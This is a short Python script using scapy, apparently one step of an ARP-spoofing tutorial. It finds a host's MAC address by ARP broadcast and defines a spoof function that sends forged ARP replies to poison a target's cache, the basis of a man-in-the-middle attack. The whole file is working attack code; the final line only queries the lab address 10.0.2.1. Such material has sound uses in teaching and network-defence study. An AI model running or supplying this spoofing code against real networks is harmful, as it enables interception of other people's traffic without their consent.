#!/usr/bin/env python3
# 3. Extract MAC address from responses

import scapy.all as scapy

def get_mac(ip):
    """ gets the MAC address from the IP """
    arp_request = scapy.ARP(pdst = ip)                                  
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")                  
    arp_request_broadcast = broadcast/arp_request                       
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]      
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)  
    scapy.send(packet)  


get_mac("10.0.2.1")